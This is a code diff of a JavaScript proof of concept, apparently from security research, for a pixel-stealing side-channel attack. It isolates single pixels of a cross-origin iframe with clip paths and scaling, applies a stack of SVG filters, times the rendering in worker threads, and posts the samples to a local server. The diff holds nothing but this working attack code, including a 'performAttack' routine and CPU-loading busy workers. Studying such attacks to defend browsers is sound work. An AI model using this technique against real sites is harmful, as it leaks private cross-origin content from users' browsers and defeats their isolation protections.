@@ -1,5 +1,6 @@
 const IMAGE_SIZE = 2000
 const SQUARE_SIZE = IMAGE_SIZE / 100
+let ALTERNATE = false
 
 function createFilterStack() {
     const defs = document.querySelector('defs');
@@ -85,8 +86,14 @@ function createFilterStack() {
 }
 
 function applyFilter() {
-    const div = document.getElementById("target-pixel");
+    if (ALTERNATE) {
+        const iframe = document.getElementById("target-iframe");
+        iframe.style.clipPath = `inset(0px ${(IMAGE_SIZE-1)}px ${(IMAGE_SIZE-1)}px 0px)`;
+        iframe.style.transformOrigin = `0px 0px`;
+        iframe.style.transform = "scale(2000)";
+    }
 
+    const div = document.getElementById("target-pixel");
     div.style.filter = "url(#filter-stack)";
 }
 
@@ -125,81 +132,71 @@ function startRun() {
         res.then(() => {
             samplerWorker.terminate();
             clearFilter();
+            busyWorkers.forEach(busyWorker => {
+                busyWorker.terminate();
+            });
             window.close();
             return;
         });
     }
 }
 
-// let busyWorkers = [];
-
-// for (let i = 0; i < 6; i++) {
-//     const busyWorker = new Worker("busy.js");
-//     busyWorkers.push(busyWorker);
-// }
-
-// busyWorkers.forEach(busyWorker => {
-//     busyWorker.postMessage(123456789);
-// });
-
-// startRun();
-
-createFilterStack();
-applyFilter();
-
 function performAttack() {
-        let imageSize = 28;
-        let seconds = 1;
+    let imageSize = 28;
+    let seconds = 1;
 
-        const samplerWorker = new Worker('sampler.js');
+    const samplerWorker = new Worker('sampler.js');
 
-        samplerWorker.postMessage(imageSize*imageSize*1000*seconds);
+    samplerWorker.postMessage(imageSize*imageSize*1000*seconds);
 
-        let count = 0
-    
-        requestAnimationFrame(animateFrame);
+    let count = 0
 
-        for (let row = 0; row < imageSize; row++) {
-            for (let column = 0; column < imageSize; column++) {
-                setTimeout(() => {
-                    console.log(`Starting worker for (${row},${column})`);
+    createFilterStack();
+    applyFilter();
 
-                    //#region Apply Clip Path (Focus on Pixel)
-                    const iframe = document.getElementById("target-iframe");
-                    iframe.style.clipPath = `inset(${row}px ${(IMAGE_SIZE-1)-column}px ${(IMAGE_SIZE-1)-row}px ${column}px)`;
-                    iframe.style.transformOrigin = `${column}px ${row}px`;
-                    iframe.style.transform = "scale(2000)";
-                    //#endregion
-                    
-                }, count++ * 1000);
-            }
-        }
+    requestAnimationFrame(animateFrame);
 
-        samplerWorker.onmessage = function(event) {
-            let res = new Promise((res, rej) => {
-                fetch("http://localhost:8000/api", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(event.data)
-                }).then(res)
-            });
-            res.then(() => {
-                samplerWorker.terminate();
-                busyWorkers.forEach(busyWorker => {
-                    busyWorker.terminate();
-                });
-                clearFilter();
-                window.close();
-                return;
-            });
+    for (let row = 0; row < imageSize; row++) {
+        for (let column = 0; column < imageSize; column++) {
+            setTimeout(() => {
+                console.log(`Starting worker for (${row},${column})`);
+
+                //#region Apply Clip Path (Focus on Pixel)
+                const iframe = document.getElementById("target-iframe");
+                iframe.style.clipPath = `inset(${row}px ${(IMAGE_SIZE-1)-column}px ${(IMAGE_SIZE-1)-row}px ${column}px)`;
+                iframe.style.transformOrigin = `${column}px ${row}px`;
+                iframe.style.transform = "scale(2000)";
+                //#endregion
+                
+            }, count++ * 1000);
         }
     }
 
+    samplerWorker.onmessage = function(event) {
+        let res = new Promise((res, rej) => {
+            fetch("http://localhost:8000/api", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(event.data)
+            }).then(res)
+        });
+        res.then(() => {
+            samplerWorker.terminate();
+            busyWorkers.forEach(busyWorker => {
+                busyWorker.terminate();
+            });
+            clearFilter();
+            window.close();
+            return;
+        });
+    }
+}
+
 let busyWorkers = [];
 
-for (let i = 0; i < 14; i++) {
+for (let i = 0; i < 0; i++) {
     const busyWorker = new Worker("busy.js");
     busyWorkers.push(busyWorker);
 }
@@ -208,4 +205,17 @@ busyWorkers.forEach(busyWorker => {
     busyWorker.postMessage(123456789);
 });
 
-performAttack();
+fetch("http://localhost:8000/args", {
+    method: "GET",
+    headers: {
+        "Content-Type": "application/json"
+    }
+}).then(res => res.json()).then(args => {
+    if (args[1] === "alternate") {
+        ALTERNATE = true;
+
+        startRun();
+    } else if (args[1] === "attack") {
+        performAttack();
+    }
+});
